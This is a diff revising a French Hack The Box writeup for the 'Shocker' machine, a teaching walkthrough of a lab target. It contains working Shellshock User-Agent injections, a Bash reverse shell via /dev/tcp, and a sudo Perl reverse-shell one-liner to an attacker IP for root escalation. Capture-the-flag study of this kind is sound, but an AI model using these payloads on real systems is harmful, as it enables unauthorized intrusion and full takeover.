@@ -66,11 +66,13 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-Dans ce writeup, tu vas découvrir la machine **Shocker**, une box **Easy** emblématique de Hack The Box, particulièrement adaptée pour débuter et comprendre concrètement l’exploitation de la vulnérabilité **Shellshock** à travers un script CGI exposé dans le répertoire `/cgi-bin/`.
+Dans ce writeup, tu vas découvrir **Shocker**, une machine **Easy** de Hack The Box idéale pour s’entraîner à l’exploitation de **Shellshock** à travers un script CGI exposé dans le répertoire `/cgi-bin/`.
 
-Grâce à une énumération méthodique, tu identifies progressivement le vecteur d’attaque, puis exploites le script `user.sh` pour obtenir un premier accès au système sous l’utilisateur *shelly*. La suite du challenge te permet ensuite de t’exercer à une **élévation de privilèges**, en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.
+Grâce à une énumération méthodique, tu identifies progressivement le vecteur d’attaque, puis tu exploites le script `user.sh` pour obtenir un premier accès au système sous l’utilisateur *shelly*. La suite du challenge te permet ensuite de réaliser une **élévation de privilèges** en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.
 
-**Ce parcours met en évidence une méthode essentielle en CTF : une énumération rigoureuse, suivie d’une exploitation ciblée et maîtrisée, en s’appuyant sur des indices simples mais fiables comme la présence d’un CGI exposé.**
+**Ce writeup montre comment une énumération rigoureuse permet d’identifier un CGI exposé, de confirmer l’exploitation de Shellshock, puis d’obtenir un accès root étape par étape.**
+
+
 
 ---
 
@@ -239,8 +241,9 @@ mon-recoweb shocker.htb
 
 Le fichier **`RESULTS_SUMMARY.txt`** te permet d’identifier rapidement les chemins intéressants sans parcourir tous les logs.
 
+Même si le site semble presque vide, cette étape reste indispensable.  
 
-Même si le site semble vide, cette étape reste indispensable : elle permet de révéler des répertoires techniques non exposés via l’interface web, comme ici /cgi-bin/.
+L’énumération de répertoires permet souvent de découvrir des chemins techniques non exposés dans l’interface web, comme des dossiers d’administration, des API internes ou des répertoires de scripts.
 
 ```txt
 ===== mon-recoweb-dev — RÉSUMÉ DES RÉSULTATS =====
@@ -324,7 +327,7 @@ http://shocker.htb/index.html (CODE:200|SIZE:137)
 
 ### Recherche de vhosts
 
-Enfin, teste rapidement la présence de vhosts  avec  le script {{< script "mon-subdomains" >}}
+Enfin, teste rapidement la présence de vhosts avec  le script {{< script "mon-subdomains" >}}
 
 ```bash
 mon-subdomains shocker.htb
@@ -377,20 +380,25 @@ Après avoir appliqué plusieurs techniques, en commençant notamment par **steg
 
 
 
-![Machine Shocker sur Hack The Box affichant une page web minimaliste exploitée via Shellshock sur un script CGI](shocker-shellshock-bug.jpg)
+![Machine Shocker sur Hack The Box affichant une page web minimaliste avec une image bug.jpg](shocker-shellshock-bug.jpg)
 
 ### Scan du `/cgi-bin/`
 
-**La mise en évidence du répertoire `/cgi-bin/` est un indicateur fort : il s’agit de l’emplacement classique des scripts exécutés via le moteur CGI d’Apache, un contexte historiquement propice à l’apparition de vulnérabilités comme Shellshock.**
+La découverte du répertoire `/cgi-bin/` constitue un indice particulièrement intéressant.  
+Dans une configuration **Apache classique**, ce dossier est utilisé pour héberger des **scripts CGI** exécutés directement par le serveur web.
 
-Conformément à ce que révèle l’énumération, tu concentres maintenant ton attention sur le répertoire `/cgi-bin/`, qui constitue un point d’entrée logique et prioritaire pour la suite de l’exploitation.
+Historiquement, ce type de mécanisme a souvent été associé à des vulnérabilités importantes, notamment **Shellshock**, qui permet d’exécuter des commandes système lorsque des scripts Bash sont exposés via CGI.
+
+Il faut toutefois garder à l’esprit que ce type de vulnérabilité n’est **pas toujours détecté automatiquement lors d’un scan agressif**. Les outils de scan testent généralement une liste limitée de scripts CGI standards. Si le script réellement présent sur la cible ne fait pas partie de cette liste, la vulnérabilité peut passer inaperçue.
+
+Lorsqu’un répertoire `/cgi-bin/` est identifié, il devient donc pertinent de **réaliser une énumération spécifique de ce dossier** afin de découvrir les scripts réellement présents sur la machine.
+
+Tu lances alors un scan ciblé du répertoire `/cgi-bin/` pour identifier d’éventuels scripts exécutables :
 
 
 ```bash
 mon-recoweb shocker.htb/cgi-bin/ --ext ".sh,.cgi,.pl"
 ```
-
-
 
 ```txt
 ===== mon-recoweb-dev — RÉSUMÉ DES RÉSULTATS =====
@@ -468,106 +476,142 @@ http://shocker.htb/cgi-bin/user.sh (CODE:200|SIZE:126)
                                
 ```
 
-La présence du script `user.sh` dans le répertoire `/cgi-bin/` constitue un signal très parlant : il s’agit d’un script Bash potentiellement exécuté via CGI, un contexte classiquement associé à la vulnérabilité **Shellshock**.
+La présence du script `user.sh` dans le répertoire `/cgi-bin/` constitue un indice particulièrement intéressant. Il s’agit d’un **script Bash potentiellement exécuté via CGI**, un contexte historiquement associé à la vulnérabilité **Shellshock**.
 
-Tu formules donc naturellement l’hypothèse d’une exploitation possible et passes à l’étape suivante : **vérifier concrètement si ce script est effectivement vulnérable**.
+### Vérification de Shellshock
 
-### Shellshock
+Tu commences par injecter, dans l’en-tête *User-Agent*, une définition de fonction suivie d’une commande simple (`echo VULNERABLE`).  
+L’objectif est de vérifier si le script CGI interprète cet en-tête comme du code Bash, conformément au mécanisme d’exploitation de la vulnérabilité **Shellshock**.
 
-Tu commences par injecter, dans l’en-tête *User-Agent*, une définition de fonction suivie d’une commande simple (`echo VULN`), conformément au mécanisme d’exploitation de la vulnérabilité **Shellshock**.
+Ce test volontairement simple permet de confirmer rapidement si la commande injectée est exécutée par le serveur.
 
-Ce test volontairement minimal permet de valider l’hypothèse formulée précédemment : si le serveur exécute la commande et renvoie la chaîne attendue dans la réponse HTTP, cela confirme que le script CGI interprète l’en-tête comme du code Bash et qu’il est donc **vulnérable à Shellshock**.
+Si le serveur exécute la commande et renvoie la chaîne attendue dans la réponse HTTP, cela confirme que le script CGI interprète l’en-tête comme du code Bash et qu’il est donc **vulnérable à Shellshock**.
+
+Lance la commande :
 
 ```bash
-curl -H 'User-Agent: () { :; }; echo; echo VULN' http://shocker.htb/cgi-bin/user.sh
-VULN
+curl -H 'User-Agent: () { :; }; echo; echo VULNERABLE' http://shocker.htb/cgi-bin/user.sh
+```
+
+et tu obtiens :
+
+```bash
+VULNERABLE
 Content-Type: text/plain
 Just an uptime test script
 
  05:37:23 up 19:59,  0 users,  load average: 0.00, 0.00, 0.00
-
 ```
 
-Pour renforcer la vérification, tu remplaces la commande précédente par `/usr/bin/id`. L’exécution de cette commande permet non seulement de confirmer l’exploitation de **Shellshock**, mais aussi d’identifier précisément le contexte utilisateur dans lequel le script CGI s’exécute.
+La présence de la chaîne `VULNERABLE` dans la réponse confirme que la commande injectée est bien exécutée sur la machine cible.
 
-Cette information est essentielle pour la suite, car elle détermine les actions possibles et oriente la stratégie d’exploitation à adopter.
+------
+
+Pour confirmer l’exploitation et identifier le contexte d’exécution du script, tu remplaces ensuite la commande précédente par `/usr/bin/id`.
+
+Cette commande permet de déterminer **quel utilisateur exécute le script CGI**, information essentielle pour comprendre les privilèges dont tu disposes sur la machine.
+
+Lance la commande :
 
 ```bash
-curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://shocker.htb/cgi-bin/user.sh 
-uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
-
+curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://shocker.htb/cgi-bin/user.sh
 ```
 
-La vulnérabilité étant désormais confirmée, tu injectes un **payload Bash de reverse shell** dans l’en-tête *User-Agent*.
+et la réponse est :
 
-Ce payload est exécuté via **Shellshock** par le script CGI et t’ouvre immédiatement une session distante vers ta machine Kali Linux, te fournissant ainsi un premier shell interactif sur la cible.
+```bash
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+```
+
+Cela indique que le script CGI est exécuté avec les privilèges de l’utilisateur **shelly**, ce qui signifie que toute commande injectée via Shellshock s’exécutera dans ce contexte.
+
+> **Note :**
+>  Pour approfondir le fonctionnement interne de la vulnérabilité Shellshock, tu peux consulter cette ressource technique :
+>  https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html
+
+### Exploitation de Shellshock
+
+La vulnérabilité étant désormais confirmée, tu peux exploiter Shellshock pour obtenir un accès distant sur la machine cible.
+
+Le principe consiste à injecter un payload Bash de reverse shell dans l’en-tête `User-Agent`.  
+
+Le script CGI vulnérable exécute alors cette commande et ouvre une connexion vers ta machine Kali.
+
+#### Préparation du listener dans Kali
+
+Avant d’envoyer le payload, tu démarres un listener Netcat sur ta machine Kali pour recevoir la connexion entrante :
+
+```bash
+nc -lvnp 4444
+```
+
+Le terminal reste alors en attente d’une connexion.
+
+#### Envoi du reverse shell via Shellshock
+
+Dans un autre terminal, tu envoies la requête HTTP contenant le payload :
 
 ```bash
 curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
-
 ```
-> **Note :**
-> Pour approfondir le fonctionnement interne de la vulnérabilité Shellshock, tu peux consulter cette ressource technique :
-> https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html
->
-> Pour générer rapidement un payload de reverse shell adapté à ton contexte, l’outil suivant peut être utile :
+
+Ce payload est exécuté via Shellshock par le script CGI et initie immédiatement une connexion vers ton listener Netcat.
+
+> Note :
+> Pour générer rapidement un payload de reverse shell adapté à ton contexte, tu peux utiliser :
 > https://www.revshells.com/
 
-### Reverse Shell dans Kali Linux
+#### Réception du shell
 
-Dans un autre terminal sur Kali Linux :
+Dans la fenêtre où Netcat est en écoute, la connexion entrante apparaît :
 
 ```bash
-nc -lvnp 4444                                                       
 Listening on 0.0.0.0 4444
 Connection received on 10.129.x.x 58744
 bash: no job control in this shell
 shelly@Shocker:/usr/lib/cgi-bin$
 ```
 
-Tu peux maintenant explorer le système :
+Tu disposes maintenant d’un premier accès shell sur la machine cible et peux commencer à explorer le système.
+
+------
+
+En explorant le système de fichiers, tu identifies rapidement le répertoire personnel de l’utilisateur `shelly`.
 
 ```bash
-shelly@Shocker:/usr/lib/cgi-bin$ ls -l
-total 4
--rwxr-xr-x 1 root root 113 Sep 22  2017 user.sh
 shelly@Shocker:/usr/lib/cgi-bin$ ls -la /home
 total 12
 drwxr-xr-x  3 root   root   4096 Sep 21  2022 .
 drwxr-xr-x 23 root   root   4096 Sep 21  2022 ..
 drwxr-xr-x  4 shelly shelly 4096 Sep 21  2022 shelly
-
-shelly@Shocker:/usr/lib/cgi-bin$ cd ~
-shelly@Shocker:/home/shelly$ ls -la
-total 36
-drwxr-xr-x 4 shelly shelly 4096 Sep 21  2022 .
-drwxr-xr-x 3 root   root   4096 Sep 21  2022 ..
-lrwxrwxrwx 1 root   root      9 Sep 21  2022 .bash_history -> /dev/null
--rw-r--r-- 1 shelly shelly  220 Sep 22  2017 .bash_logout
--rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 .bashrc
-drwx------ 2 shelly shelly 4096 Sep 21  2022 .cache
-drwxrwxr-x 2 shelly shelly 4096 Sep 21  2022 .nano
--rw-r--r-- 1 shelly shelly  655 Sep 22  2017 .profile
--rw-r--r-- 1 root   root     66 Sep 22  2017 .selected_editor
--r--r--r-- 1 root   root     33 Nov 21 09:38 user.txt
-
 ```
+
+Tu te rends alors dans le répertoire personnel :
+
+```bash
+cd ~
+shelly@Shocker:/home/shelly$ ls -la
+```
+
+et tu identifies rapidement le fichier **user.txt**.
 
 ### user.txt
 
 ```bash
 shelly@Shocker:/home/shelly$ cat user.txt
 caf00xxxxxxxxxxxxxxxxxxxxxxxxxxxe4a7
-shelly@Shocker:/home/shelly$
 ```
 
-
+La récupération du fichier **user.txt** confirme que la **prise de pied sur la machine est réussie**.
 
 ---
 
 ## Escalade de privilèges
 
 {{< escalade-intro user="shelly" >}}
+
+
+
 ### Sudo -l
 
 Tu commences toujours par vérifier les droits <code>sudo</code> :
@@ -582,36 +626,46 @@ User shelly may run the following commands on Shocker:
 shelly@Shocker:/home/shelly$
 ```
 
-### sudo perl
+### Exploitation de Perl via sudo
 
-Puisque l’utilisateur `shelly` est autorisé à exécuter des commandes **Perl** avec les privilèges **root** via `sudo`, tu peux exploiter cette configuration pour élever tes privilèges.
+Puisque l’utilisateur `shelly` est autorisé à exécuter `perl` avec les privilèges `root` via `sudo`, toute commande lancée avec `sudo perl` sera exécutée avec les privilèges root.
 
-Pour cela, tu utilises un **payload Bash encapsulé en Perl**, par exemple généré depuis [revshells.com](https://www.revshells.com/), et l’exécutes via `sudo perl`. Cette technique te permet d’obtenir un shell avec les droits root de manière directe et contrôlée.
+Tu utilises ensuite un payload de reverse shell Perl, par exemple généré avec [revshells.com](https://www.revshells.com/), que tu exécutes avec `sudo perl`.
+
+La commande est alors lancée avec les privilèges root, ce qui permet d’ouvrir une connexion reverse shell vers ta machine Kali.
+
+### Root Shell dans Kali
+
+Lance le listener dans une fenêtre Kali :
 
 ```bash
-shelly@Shocker:/home/shelly$ perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
+nc -lvnp 12345 
 ```
 
-### Root Shell dans Kali Linux
+et ensuite la commande perl dans une autre fenêtre de Kali :
 
 ```bash
-nc -lvnp 12345                                                      
+sudo perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
+```
+
+et tu verras la connexion arriver :
+
+```bash
 Listening on 0.0.0.0 12345
 Connection received on 10.129.x.x 34840
 root@Shocker:/home/shelly# 
 ```
 
-Tu obtiens alors un shell **bash** avec les privilèges **root**, que tu peux stabiliser à l’aide de la recette {{< recette "stabiliser-reverse-shell" >}} afin de travailler dans un environnement plus confortable.
+Tu obtiens alors un shell `bash` avec les privilèges `root`, que tu peux éventuellement stabiliser à l’aide de la recette {{< recette "stabiliser-reverse-shell" >}} afin de travailler dans un environnement plus confortable.
 
 ### root.txt
 
-Une fois connecté en tant que root, il ne te reste plus qu’à aller à l’essentiel et afficher le contenu du fichier `root.txt`.
+Une fois le shell root obtenu, il ne reste plus qu’à lire le fichier `root.txt`.
 
 ```bash
 root@Shocker:/home/shelly# cat /root/root.txt
 cat /root/root.txt
 be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef
-
 ```
 
 
@@ -620,10 +674,14 @@ be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef
 
 ## Conclusion
 
-Cette machine illustre parfaitement l’importance d’une **énumération structurée** et d’une **lecture attentive des indices**, même lorsque la surface d’attaque semble, au premier abord, quasi inexistante.
+Cette machine illustre parfaitement l’importance d’une **énumération structurée** et d’une **lecture attentive des indices**, même lorsque la surface d’attaque semble, au premier abord, très limitée.
 
-À partir d’une interface web minimaliste, la découverte du répertoire `/cgi-bin/` t’oriente vers une piste classique mais toujours pertinente : **les scripts CGI potentiellement vulnérables à Shellshock**. En validant progressivement l’hypothèse — test de la faille, exécution de commandes simples, puis obtention d’un reverse shell — tu accèdes au système en tant qu’utilisateur avant de conclure par une **élévation de privilèges directe et maîtrisée** via `sudo` et Perl.
+À partir d’une interface web minimaliste, la découverte du répertoire `/cgi-bin/` oriente rapidement l’analyse vers une piste classique mais toujours pertinente : **les scripts CGI potentiellement vulnérables à Shellshock**.
 
-**Un challenge Easy idéal pour débuter, qui montre qu’une vulnérabilité historique comme Shellshock reste exploitable lorsqu’elle n’est pas correctement corrigée, et qu’en CTF, une bonne méthode vaut souvent plus qu’une batterie d’outils.**
+En validant progressivement l’hypothèse — test de la faille, exécution de commandes simples, puis obtention d’un reverse shell — tu obtiens un premier accès au système avant de conclure par une **élévation de privilèges via `sudo` et Perl**.
+
+**Un excellent challenge Easy pour découvrir Shellshock et comprendre l’importance d’une énumération méthodique dans un CTF.**
+
+
 
 {{< feedback >}}
